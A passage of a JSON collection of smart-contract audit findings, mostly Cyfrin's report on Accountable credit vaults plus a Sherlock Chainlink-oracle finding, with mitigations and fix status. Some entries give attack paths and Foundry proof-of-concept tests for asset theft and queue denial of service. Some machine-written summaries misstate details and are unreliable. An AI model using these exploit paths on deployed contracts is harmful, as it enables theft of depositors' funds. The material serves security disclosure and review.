lateInterestGracePeriod: 0,\n        lateInterestPenalty: 0,\n        withdrawalPeriod: 0\n    });\n    vm.prank(manager);\n    usdcLoan.setTerms(terms);\n    vm.prank(borrower);\n    usdcLoan.acceptTerms();\n\n    // Single LP deposits during deposit period → 1:1 shares at PRECISION\n    vm.prank(alice);\n    usdcVault.deposit(USDC_AMOUNT, alice, alice);\n    assertEq(usdcVault.totalAssets(), USDC_AMOUNT, \"vault funded\");\n\n    // Borrower draws full principal → vault drained\n    vm.prank(borrower);\n    usdcLoan.borrow(USDC_AMOUNT);\n    assertEq(usdcVault.totalAssets(), 0, \"all assets borrowed\");\n    assertEq(usdcLoan.loan().outstandingPrincipal, USDC_AMOUNT, \"principal outstanding\");\n\n    // Time passes → interest accrues virtually (scale factor > PRECISION)\n    vm.warp(block.timestamp + 180 days);\n    uint256 sfBefore = usdcLoan.accrueInterest();\n    assertGt(sfBefore, 1e36, \"scale factor increased (virtual interest)\");\n\n    // Borrower repays EXACTLY principal (no extra for interest)\n    usdc.mint(borrower, USDC_AMOUNT);\n    vm.startPrank(borrower);\n    usdc.approve(address(usdcVault), type(uint256).max);\n    usdcLoan.repay(USDC_AMOUNT);\n    vm.stopPrank();\n\n    // Loan marked repaid even though totalAssets < totalShareValue at sfBefore\n    assertEq(uint8(usdcLoan.loanState()), uint8(LoanState.Repaid), \"loan flipped to Repaid\");\n\n    // After Repaid, share price uses assetShareRatio (actual assets), not the higher scale factor.\n    // With one LP and totalAssets == totalSupply, ratio == PRECISION → no interest realized.\n    uint256 spAfter = usdcLoan.sharePrice(address(usdcVault));\n    assertEq(spAfter, 1e36, \"share price fell back to assetShareRatio (no interest paid)\");\n\n    // Sanity: vault now only holds repaid principal\n    assertEq(usdcVault.totalAssets(), USDC_AMOUNT, \"vault holds only principal after repay\");\n    assertEq(usdcVault.totalSupply(), USDC_AMOUNT, \"shares unchanged\");\n\n    // Now borrower cannot \"pay the interest\" anymore\n    vm.prank(borrower);\n    vm.expectRevert(); // blocked by _requireLoanOngoing()\n    usdcLoan.supply(1e6);\n}\n```\n\n**Recommended Mitigation:** Consider modeling borrower liability in debt shares instead of tracking principal/interest separately.\n\nOn `borrow(assets)`, after `accrue()`, mint `debtShares = ceil(assets * PRECISION / price)` where `price = scaleFactor`. Debt then equals `debtShares * price / PRECISION`. Interest accrual only moves `price`, not shares.\n\nOn `repay(assets)`, after `accrue()`, burn `sharesToBurn = floor(assets * PRECISION / price)` (capped to balance). When `debtShares == 0`, the loan is repaid.\n\nThis guarantees interest can always be repaid at the current price, prevents the “principal hits zero” dead-end, and supports partial/frequent repayments cleanly. If protocol/establishment fees apply, take them on each accrual/settle step before any excess refunds to keep fee accounting correct.\n\n**Accountable:** Fixed in commits [`fce6961`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/fce6961c71269739ec35da60131eaf63e66e1726) and [`8e53eba`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/8e53eba7340f223f86c9c392f50b8b2d885fdd39)\n\n**Cyfrin:** Verified. Debt is not tracked using shares.\n\n\\clearpage",
      "summary": "\nThe bug report is about a code called `AccountableOpenTerm`, which accrues interest but has no mechanism to pay or realize the interest. This means that any interest accrued by the code is never delivered to the intended recipients. This can happen intentionally or unintentionally, resulting in the borrower avoiding paying any interest. A test was added to the code to showcase this bug, and a recommended solution is proposed to fix it. The bug has been fixed in the code by the developers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62972",
      "title": "`AccountableAsyncRedeemVault::fulfillRedeemRequest` ignores processingMode and directly uses currentPrice for finalizing a redeem request",
      "impact": "HIGH",
      "content": "**Description:** When a redeem request is placed using `requestRedeem` function, it pushes a new request struct into the withdrawal queue. If the processingMode of the vault is configured to be `== RequestPrice`, the current `sharePrice` at that time is stored as the \"request.sharePrice\" for later use when the request will be processed.\n\nAll functions in the `AccountableWithdrawalQueue` honour this price and the assets user receives depends on this stored sharePrice (in case processingMode == RequestPrice).\n\nBut there is one function in `AccountableAsyncRedeemVault` that ignores the processing mode and uses the current `sharePrice`.\n\n```solidity\n    function fulfillRedeemRequest(address controller, uint256 shares) public onlyOperatorOrStrategy {\n        _fulfillRedeemRequest(_requestIds[controller], controller, shares, sharePrice());\n        _reduce(controller, shares);\n    }\n```\n\nThe `sharePrice` here fetches the current price of the shares, but if the `sharePrice` changed since the request time, it can be unfavourable to the user as he could get lesser amount of assets just because of the delay in processing, and that should not happen when the `processingMode == RequestPrice`.\n\n**Impact:** For a vault configured with `processingMode == RequestPrice`, the `fulfillRedeemRequest` functions breaks the guarantee that the price stored at time of placing the redeem request would be used for calculating the assets user gets in return, which might be unfavourable if the sharePrice decreased due to any reason.\n\n**Recommended Mitigation:**\n```solidity\n    function fulfillRedeemRequest(address controller, uint256 shares) public onlyOperatorOrStrategy {\n+++         uint256 price;\n+++         if (processingMode == ProcessingMode.CurrentPrice)\n+++              price = sharePrice();\n+++       }\n+++         else {\n+++              uint128 requestId = _requestIds[controller];\n+++              price = _queue.requests[requestId].sharePrice;\n+++      }\n\n               _fulfillRedeemRequest(_requestIds[controller], controller, shares, price);\n               _reduce(controller, shares);\n           }\n```\n\n**Accountable:** Not applicable due to `processingMode` being removed in commit [`4e5eef5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/4e5eef57464d548ec09048eae27b6fcc1489a5c3)",
      "summary": "\nThis bug report highlights an issue with the `fulfillRedeemRequest` function in the `AccountableAsyncRedeemVault` contract. This function does not properly follow the `processingMode` configuration and instead uses the current share price, which may result in users receiving less assets than expected. A suggested solution is provided to mitigate this issue. However, it is noted that this bug is no longer applicable due to the removal of `processingMode` in a recent commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62971",
      "title": "Partial redemptions can be used to steal assets",
      "impact": "HIGH",
      "content": "**Description:** The request state is not handled properly when redeem requests are filled partially, leading to an inflated redemption price for the remaining part of the request.\n\n- When a new redemption is pushed onto an existing requestID, then the average redemption price is calculated using the updated `totalValue` and updated `request.shares`. This is then stored as the `request.sharePrice` (used for calculating assets owed for those shares).\n\n```solidity\n        } else { // if controller had an existing active requestID\n            requestId = requestId_;\n\n            WithdrawalRequest storage request = _queue.requests[requestId_];\n\n            request.shares += shares;\n\n            if (processingMode == ProcessingMode.RequestPrice) {\n                request.totalValue += shares.mulDiv(sharePrice, _precision);\n                request.sharePrice = request.totalValue.mulDiv(_precision, request.shares); // the average sharePrice is being calculated here.\n            } // the whole request will have a single price, averaged recursively as new redeem requests come up.\n\n        totalQueuedShares += shares;\n    }\n```\n\n\n- This works fine when request is fulfilled completely or cancelled completely as in those cases request data gets wiped out. But the problem is that when such a request is filled partially, this totalValue is never decreased while request.shares is decreased.\n\n\n```solidity\n    function _reduce(address controller, uint256 shares) internal returns (uint256 remainingShares) {\n        uint128 requestId = _requestIds[controller];\n        if (requestId == 0) revert NoQueueRequest();\n\n        uint256 currentShares = _queue.requests[requestId].shares;\n        if (shares > currentShares || currentShares == 0) revert InsufficientShares();\n\n        remainingShares = currentShares - shares;\n        totalQueuedShares -= shares;\n\n        if (remainingShares == 0) {\n            _delete(controller, requestId);\n        } else {\n            _queue.requests[requestId].shares = remainingShares;\n        } // @audit the totalValue is not updated here.\n    }\n```\n\n\nThis is the attack path :\n- User places a redeem request for 100 shares at a time when sharePrice == 2. So the request data stored is => {request.totalValue = 200, request.sharePrice = 2, request.shares = 100}.\n- This request gets fulfilled partially ie. 50 shares. Resultant state => {request.totalValue = 200, request.sharePrice = 2, request.shares = 50}. User got 100 assets.\n- User places another redeem request with 100 shares for the same controller address, thus the same requestID data will be modified. The new sharePrice will be calculated using an inflated \"request.totalValue\" and a normal request.shares. As per the calculation, the resultant state => {request.totalValue = 400, request.shares = 150, and request.sharePrice = 2.66}\n- Assume this request gets filled completely. User now gets 400 assets.\n\nUser got a total of 500 assets for redeeming 200 shares, even though the sharePrice was only 2. This is because the calculation uses an inflated value of request.totalValue to calculate the redemption price.\n\n- This request.sharePrice is used when calculating assets owed to the controller in  `_fulfillRedeemRequest()` flow\n\nThis means an inflated amount of assets will be added to the VaultState.maxWithdraw => allowing controller to claim more assets than they deserved if actual sharePrice was used.\n\nNote : Partial redemption is possible when `fulfillRedeemRequest()` is called with a portion of the request's shares, and also possible when `processUptoShares()` is used and it hits a block with maxShares/ liquidityShares (such that a particular request is not processed completely.\n\n**Impact:** An attacker can steal assets easily if their redeem request was fulfilled partially, in case the vault is configured with a processingMode == RequestPrice.\n\nThis issue exists only when processingMode == RequestPrice, as only then the request.sharePrice value is used for calculating assets owed.\n\n**Recommended Mitigation:** Consider removing the processingMode logic entirely to simplify the system, or decrease redeemed assets from `request.totalValue` as part of the `_reduce()` function.\n\n**Accountable:** Fixed in commit [`4e5eef5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/4e5eef57464d548ec09048eae27b6fcc1489a5c3)\n\n**Cyfrin:** Verified. `processingMode` removed as well as `totalValue`.\n\n\\clearpage",
      "summary": "\nThis bug report describes an issue where the request state is not handled properly when redeem requests are partially filled. This leads to an inflated redemption price for the remaining part of the request. This issue can be exploited by an attacker to steal assets if their redeem request is fulfilled partially. The issue occurs only when the processing mode is set to RequestPrice. The recommended mitigation is to remove the processing mode logic or decrease the redeemed assets from the total value in the _reduce() function. The issue has been fixed in the commit 4e5eef5 and verified by Cyfrin. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62970",
      "title": "Critical DOS in queue processing if async cancellations are allowed",
      "impact": "HIGH",
      "content": "**Description:** The `cancelRedeemRequest()` function can be used to DOS the queue processing (ie. `processUpToShares()` and `processUpToRequestID()` can be made to revert).\n\nThis is the attack path :\n- `cancelRedeemRequest()` marks `state.pendingCancelRedeemRequest = true`;\n- Assume that this cancellation is not instantly fulfilled, as the associated strategy may support async cancellations\n\n\n```solidity\n    function cancelRedeemRequest(uint256 requestId, address controller) public onlyAuth {\n        _checkController(controller);\n        VaultState storage state = _vaultStates[controller];\n        if (state.pendingRedeemRequest == 0) revert NoPendingRedeemRequest();\n        if (state.pendingCancelRedeemRequest) revert CancelRedeemRequestPending();\n\n        state.pendingCancelRedeemRequest = true;\n\n        bool canCancel = strategy.onCancelRedeemRequest(address(this), controller); // @audit strategy can choose to return false here, thus mandating async cancellations.\n        if (canCancel) {\n            uint256 pendingShares = state.pendingRedeemRequest;\n\n            _fulfillCancelRedeemRequest(uint128(requestId), controller);\n            _reduce(controller, pendingShares);\n        }\n        emit CancelRedeemRequest(controller, requestId, msg.sender);\n    }\n```\n\n\n\n- At this step, it also skips \"reducing\" the shares in request state, as _reduce() will only be called when cancellation is fulfilled via `fulfillCancelRedeemRequest()`\n- Later when `processUpToShares()` is called, `_processRequest()` returns normal request data (does not return \"zero values\" as request.shares was not reduced in the cancel logic ) => so it doesn't break the loop or continue with nextRequestID\n- It goes on to call `_fulfillRedeemRequest()`, where it reverts due to pendingCancelRedeemRequest = true\n\n```solidity\n    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price)\n        internal\n        override\n    {\n        VaultState storage state = _vaultStates[controller];\n        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();\n        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();\n        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();  // @audit\n```\n\nThis means even a single async cancellation (that is pending for processing) can DOS queue processing.\n\n\n**Impact:** Queue processing can be repeatedly DOS'ed under normal operations as well as by an attacker frontrunning a process call, in case the strategy contract allows async cancellations.\n\n\n**Recommended Mitigation:** Consider removing async cancellations' support from the system, which prevents this kind of attacks.\n\n**Accountable:** Fixed in commit [`2eeb273`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2eeb2736eb5ba8dafa2c9f2f458b31fd8eb2d6bf)\n\n**Cyfrin:** Verified. Async cancelation of redeem requests now removed.",
      "summary": "\nThe `cancelRedeemRequest()` function has a bug that can be used to cause the queue processing to revert. This is because the function marks `state.pendingCancelRedeemRequest` as true and skips reducing the shares in the request state. When `processUpToShares()` is called, `_processRequest()` does not return zero values as expected, causing the loop to break. As a result, the queue processing can be repeatedly DOS'ed, even if the strategy contract allows async cancellations. The bug has been fixed by removing async cancellations' support from the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62969",
      "title": "`AccountableAsyncRedeemVault::fulfillCancelRedeemRequest` can de-sync request data causing permanent DOS for queue processing",
      "impact": "HIGH",
      "content": "**Description:** `fulfillCancelRedeemRequest()` function first finalises the cancellation of the redeeem request with input `requestID`, and then calls `_reduce()` to update the request state and `totalQueuedShares`.\n\n```solidity\n    function fulfillCancelRedeemRequest(address controller) public onlyOperatorOrStrategy {\n        _fulfillCancelRedeemRequest(_requestIds[controller], controller);\n        _reduce(controller, _vaultStates[controller].pendingRedeemRequest);\n    }\n```\n\nThe problem here is that it is using current value of `_vaultStates[controller].pendingRedeemRequest` in the `_reduce()` call, but it has been set to zero in `_fulfillCancelRedeemRequest()`.\n\nThis means `_reduce()` here will always be called with zero shares, and it does not revert when shares input is zero. But it corrupts the request struct and `totalQueuedShares` value.\n\nThe request will still exist with actual shares values, and create problems in usual batch processing of the queue.\n\nOne example of the resulting impact is this :\n1. User X places a redeem request for 100 shares\n2. User X cancels this redeem request\n3. His request is not fulfilled instantly (this depends on the strategy)\n4. Operator calls `fulfillCancelRedeemRequest()` to process this cancellation.\n5. The call goes through properly. As a result [state.pendingRedeemRequest = 0] but the request state still has request.shares == 100 and other values. Also, the `_queue.nextRequestID` remains unchanged.\n6. Now when batch processing proceeds via `processUpToShares()`, it is guaranteed that User X's requestID will also be processed (it is still in the queue from nextRequestID to lastRequestID) and when that happens, it will suffer a revert in `_processUptoShares()` => `_fulfillRedeemRequest()` because `state.pendingRedeemRequest` was set to == 0 in step 5.\n\n```solidity\n    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price)\n        internal\n        override\n    {\n        VaultState storage state = _vaultStates[controller];\n        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();\n        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();\n        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();\n```\n\n\n**Impact:** If this function is ever called, there will be a permanent de-sync between the values stored as per requestID data and the vaultState of the controller, which will interfere with queue processing in different ways.\n\nThe example showcased here is a critical DOS blocking queue processing permanently. This will happen for strategies that offer async cancellation processing, but since vault is expected to be compatible with this behavior, fixing this is critical.\n\n\n**Recommended Mitigation:**\n```solidity\n    function fulfillCancelRedeemRequest(address controller) public onlyOperatorOrStrategy {\n\n+++        uint256 pendingShares = state.pendingRedeemRequest;\n               _fulfillCancelRedeemRequest(_requestIds[controller], controller);\n---          _reduce(controller, _vaultStates[controller].pendingRedeemRequest);\n+++        _reduce(controller, pendingShares);\n    }\n```\n\n**Accountable:** Fixed in commit [`84946dd`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/84946dd49dd70f9f5dfe40184beb52b734362701)\n\n**Cyfrin:** Verified. `pendingShares` now cached before fulfill and then passed as argument to `_reduce`.",
      "summary": "\nThe `fulfillCancelRedeemRequest()` function in the code first cancels a redeem request and then updates the request state and total queued shares. However, there is a bug where the `_reduce()` function is called with a value of zero shares, even though the request state was set to zero in the previous step. This can cause problems in the batch processing of the queue and can lead to permanent de-sync between the values stored and the vault state. To fix this, the code has been updated to cache the pending shares before fulfilling the cancel request and then passing it as an argument to the `_reduce()` function. This bug has been fixed in commit `84946dd`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "62968",
      "title": "Cancelling redeem requests permanently blocks the withdrawal queue",
      "impact": "HIGH",
      "content": "**Description:** `AccountableWithdrawalQueue` can deadlock at the head if the current head entry (`_queue.nextRequestId`) is fully removed (e.g., by a cancel that zeroes `shares` and clears `controller`) without advancing `nextRequestId`.\n\nIn [`AccountableWithdrawalQueue::_processUpToShares`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L153-L156) and [`AccountableWithdrawalQueue::_processUpToRequestId`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L193-L196), the loop checks `if (shares_ == 0) break;` before incrementing `nextRequestId`:\n```solidity\n(uint256 shares_, uint256 assets_, bool processed_) =\n    _processRequest(request_, liquidity, maxShares_, precision_);\n\nif (shares_ == 0) break;\n```\n\nWhen the head is an empty entry (`controller == address(0)`), [`AccountableWithdrawalQueue::_processRequest`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L219) returns `(0, 0, true)`, `shares_ == 0`, the loop breaks:\n```solidity\nif (request.controller == address(0)) return (0, 0, true);\n```\nThe head never advances, so every subsequent call to process or preview gets stuck on the same empty head forever.\n\nThis can be triggered by any user whose request is currently at the head by canceling any dust amount (even 1 wei) such that their head entry is fully deleted at the time of processing (e.g., instant cancel-fulfillment) in [`AccountableWithdrawalQueue::_delete`](https://github.com/Accountable-Protocol/audit-2025-09-accountable/blob/fc43546fe67183235c0725f6214ee2b876b1aac6/src/vault/queue/AccountableWithdrawalQueue.sol#L130-L134):\n```solidity\n/// @dev Deletes a withdrawal request and its controller from the queue\nfunction _delete(address controller, uint128 requestId) private {\n    delete _queue.requests[requestId];\n    delete _requestIds[controller];\n}\n```\nOnce the head becomes an empty slot and the pointer doesn’t move, the entire queue is bricked.\n\n\n**Impact:** Queue is permanently stuck and no subsequent user will be able to withdraw.\n\n**Proof of Concept:** Add the following test to `test/vault/AccountableWithdrawalQueue.t.sol`:\n```solidity\nfunction testHeadDeletionDeadlocksQueue() public {\n    // Setup: deposits are instant, redemptions are queued, cancel is instantly fulfilled\n    strategy.setInstantFulfillDeposit(true);\n    strategy.setInstantFulfillRedeem(false);\n    strategy.setInstantFulfillCancelRedeem(true);\n\n    // Seed vault with liquidity and create first (head) request by Alice\n    // This helper deposits for Alice and Bob at 1e36 price.\n    _setupInitialDeposits(1e36, DEPOSIT_AMOUNT);\n\n    // 1) Alice creates a redeem request -> head of queue (requestId = 1)\n    uint256 aliceSharesToQueue = 1;\n    vm.prank(alice);\n    uint256 headId = vault.requestRedeem(aliceSharesToQueue, alice, alice);\n    assertEq(headId, 1, \"first request should be head (id = 1)\");\n\n    // 2) Alice cancels; cancel is fulfilled instantly by the strategy.\n    //    This fully removes the head request entry (controller becomes address(0)),\n    //    but _queue.nextRequestId is NOT advanced by the implementation.\n    vm.prank(alice);\n    vault.cancelRedeemRequest(headId, alice);\n\n    // Sanity: queue indices should still point at the deleted head\n    (uint128 nextRequestId, uint128 lastRequestId) = vault.queue();\n    assertEq(nextRequestId, 1, \"nextRequestId remains stuck at deleted head\");\n    assertGe(lastRequestId, 1, \"there is at least one request in the queue history\");\n\n    // 3) Charlie makes a NEW redeem request -> tail (requestId = 2).\n    //    This request is perfectly processable with existing liquidity.\n    token.mint(charlie, 1000e6);\n    vm.prank(charlie);\n    token.approve(address(vault), 1000e6);\n    vm.prank(charlie);\n    vault.deposit(1000e6, charlie);\n\n    uint256 charlieShares = vault.balanceOf(charlie) / 2;\n    vm.prank(charlie);\n    uint256 tailId = vault.requestRedeem(charlieShares, charlie, charlie);\n    assertEq(tailId, 2, \"second request should be tail (id = 2)\");\n\n    // Check queue bounds reflect head(=1, deleted) and tail(=2, valid)\n    (nextRequestId, lastRequestId) = vault.queue();\n    assertEq(nextRequestId, 1, \"still pointing at deleted head\");\n    assertEq(lastRequestId, 2, \"tail id should be 2\");\n\n    // 4) Attempt to process. BUG: _processUpToShares reads head slot (controller==0),\n    //    inner _processRequest returns (0,0,true), outer loop sees shares_==0 and BREAKS\n    //    BEFORE ++nextRequestId, so NOTHING gets processed and the queue is permanently stuck.\n    uint256 assetsBefore = vault.totalAssets();\n    uint256 used = vault.processUpToShares(type(uint256).max);\n    assertEq(used, 0, \"deadlock: processing does nothing while a valid tail exists\");\n\n    (uint256 _shares, uint256 _assets) = vault.processUpToRequestId(2);\n    assertEq(_shares, 0, \"deadlock: processing does nothing while a valid tail exists\");\n    assertEq(_assets, 0, \"deadlock: processing does nothing while a valid tail exists\");\n\n    // 5) Verify tail wasn't progressed at all\n    assertEq(vault.claimableRedeemRequest(0, charlie), 0, \"tail remains unclaimable\");\n    assertEq(vault.pendingRedeemRequest(0, charlie), charlieShares, \"tail remains fully pending\");\n    assertEq(vault.totalAssets(), assetsBefore, \"no reserves changed due to deadlock\");\n    (nextRequestId, lastRequestId) = vault.queue();\n    assertEq(nextRequestId, 1, \"nextRequestId is still stuck at deleted head\");\n}\n```\n\n**Recommended Mitigation:** Consider incrementing the counter if it's processed, and `continue` instead of break:\n```solidity\nif (shares_ == 0) {\n    if (processed_) {\n        ++nextRequestId;\n        continue;\n    }\n    break;\n}\n```\n\n**Accountable:** Fixed in commits [`2df3becf`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2df3becf29e20d0d1707eb0567b51fe103f606ed) and [`b432631`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/b432631089e400742b1e584976e26e9e7ae8da85)\n\n**Cyfrin:** Verified. The counter is now incremented if the request was processed even if shares were 0.",
      "summary": "\nThe bug report describes an issue with the `AccountableWithdrawalQueue` that can cause it to become permanently stuck. This happens when the current head entry is fully removed without advancing the next request ID. This can be triggered by a user canceling a small amount of their request, which results in the head becoming an empty slot and the pointer not moving. This means that subsequent users will not be able to withdraw from the queue. The report includes a proof of concept test to demonstrate the issue and recommends a mitigation by incrementing the counter and using `continue` instead of `break`. The bug has been fixed by the team and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Accountable",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-16-cyfrin-accountable-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Immeas",
        "Chinmay",
        "Alexzoid"
      ]
    },
    {
      "id": "6689",
      "title": "M-3: _validateAndGetPrice() doesn't check If Arbitrum sequencer is down in Chainlink feeds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-bond-judging/issues/1 \n\n## Found by \nAvci\n\n## Summary\nWhen utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh, even when the sequencer is down. This vulnerability could potentially be exploited by malicious actors to gain an unfair advantage.\n\n## Vulnerability Detail\nThere is no check: \n```soldity\nsolidity function _validateAndGetPrice(AggregatorV2V3Interface feed_, uint48 updateThreshold_)\n        internal\n        view\n        returns (uint256)\n    {\n        // Get latest round data from feed\n        (uint80 roundId, int256 priceInt, , uint256 updatedAt, uint80 answeredInRound) = feed_\n            .latestRoundData();\n        // @audit check if Arbitrum L2 sequencer is down in Chainlink feeds: medium\n        // Validate chainlink price feed data\n        // 1. Answer should be greater than zero\n        // 2. Updated at timestamp should be within the update threshold\n        // 3. Answered in round ID should be the same as the round ID\n        if (\n            priceInt <= 0 ||\n            updatedAt < block.timestamp - uint256(updateThreshold_) ||\n            answeredInRound != roundId\n        ) revert BondOracle_BadFeed(address(feed_));\n        return uint256(priceInt);\n    }\n```\n## Impact\ncould potentially be exploited by malicious actors to gain an unfair advantage.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-bond-0xdanial/blob/0d6f979c9f361bc1101f429b3bb09264577b9a71/bonds/src/BondChainlinkOracle.sol#L129\n## Tool used\n\nManual Review\n\n## Recommendation\ncode example of Chainlink:\nhttps://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code \n\n\n## Discussion\n\n**Oighty**\n\nAgree this should be fixed for using the Chainlink Oracle Contract on L2s. I think the best way to handle is to have a mainnet version of the contract (as is) and L2 version of the contract which implements the sequencer feed check.\n\n**UsmannK**\n\nEscalate for 10 USDC.\n\nWatson states that the arbitrum sequencer may temporarily go down and cause stale prices to be read from the oracle. This is incorrect; the arbitrum sequencer going down cannot result in stale prices to be accepted. \n\nStale prices will have an old `updatedAt` timestamp and be rejected by the following code:\nhttps://github.com/sherlock-audit/2023-02-bond/blob/8a326a4b39fdaf9eaf5911cfd3e9676a83c24a58/bonds/src/BondChainlinkOracle.sol#L141-L146\n\n```solidity\n        // Validate chainlink price feed data\n        // 1. Answer should be greater than zero\n        // 2. Updated at timestamp should be within the update threshold\n        // 3. Answered in round ID should be the same as the round ID\n        if (\n            priceInt <= 0 ||\n            updatedAt < block.timestamp - uint256(updateThreshold_) ||\n            answeredInRound != roundId\n        ) revert BondOracle_BadFeed(address(feed_));\n```\n\nThe watson's link (https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum) is actually a metadata feed about historical uptime/downtime data that is not related to the supposed issue.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> \n> Watson states that the arbitrum sequencer may temporarily go down and cause stale prices to be read from the oracle. This is incorrect; the arbitrum sequencer going down cannot result in stale prices to be accepted. \n> \n> Stale prices will have an old `updatedAt` timestamp and be rejected by the following code:\n> https://github.com/sherlock-audit/2023-02-bond/blob/8a326a4b39fdaf9eaf5911cfd3e9676a83c24a58/bonds/src/BondChainlinkOracle.sol#L141-L146\n> \n> ```solidity\n>         // Validate chainlink price feed data\n>         // 1. Answer should be greater than zero\n>         // 2. Updated at timestamp should be within the update threshold\n>         // 3. Answered in round ID should be the same as the round ID\n>         if (\n>             priceInt <= 0 ||\n>             updatedAt < block.timestamp - uint256(updateThreshold_) ||\n>             answeredInRound != roundId\n>         ) revert BondOracle_BadFeed(address(feed_));\n> ```\n> \n> The watson's link (https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum) is actually a metadata feed about historical uptime/downtime data that is not related to the supposed issue.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Oighty**\n\nIssue fixed here: https://github.com/Bond-Protocol/bonds/pull/53\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/pull/53\n\n**hrishibhat**\n\nEscalation rejected\n\nUpdating the escalation resolution.  \nConsidering this issue as a valid medium, additional sponsor comments:\n> If it updates again within the update threshold. The feeds typically can update several times within a threshold period if the price is moving a lot\nwhen the sequencer is down, the new price won't be reported to the chain. the feed on the L2 will return the value it had when it went down\n\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Updating the escalation resolution.  \n> Considering this issue as a valid medium, additional sponsor comments:\n> > If it updates again within the update threshold. The feeds typically can update several times within a threshold period if the price is moving a lot\n> when the sequencer is down, the new price won't be reported to the chain. the feed on the L2 will return the value it had when it went down\n> \n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about a vulnerability found in the BondChainlinkOracle.sol smart contract. The vulnerability exists in the _validateAndGetPrice() function, which does not check if the Arbitrum sequencer is down in Chainlink feeds. This means that stale prices can be accepted, which malicious actors could potentially exploit to gain an unfair advantage. The code snippet for this function can be found at https://github.com/sherlock-audit/2023-02-bond-0xdanial/blob/0d6f979c9f361bc1101f429b3bb09264577b9a71/bonds/src/BondChainlinkOracle.sol#L129.\n\nThe vulnerability was found by Avci and manually reviewed. The recommendation is to implement a check for the sequencer in the L2 version of the contract, and a code example of Chainlink can be found at https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code.\n\nThe issue was discussed by Oighty, UsmannK, and sherlock-admin. Oighty suggested having a mainnet version of the contract and an L2 version of the contract which implements the sequencer feed check. UsmannK suggested escalating the issue for 10 USDC, but sherlock-admin rejected the escalation after further discussion. Watson's link (https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum) was actually a metadata feed about historical uptime/downtime data that is not related to the supposed issue.\n\nThe issue was fixed in https://github.com/Bond-Protocol/bonds/pull/53, and the escalation was rejected. Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
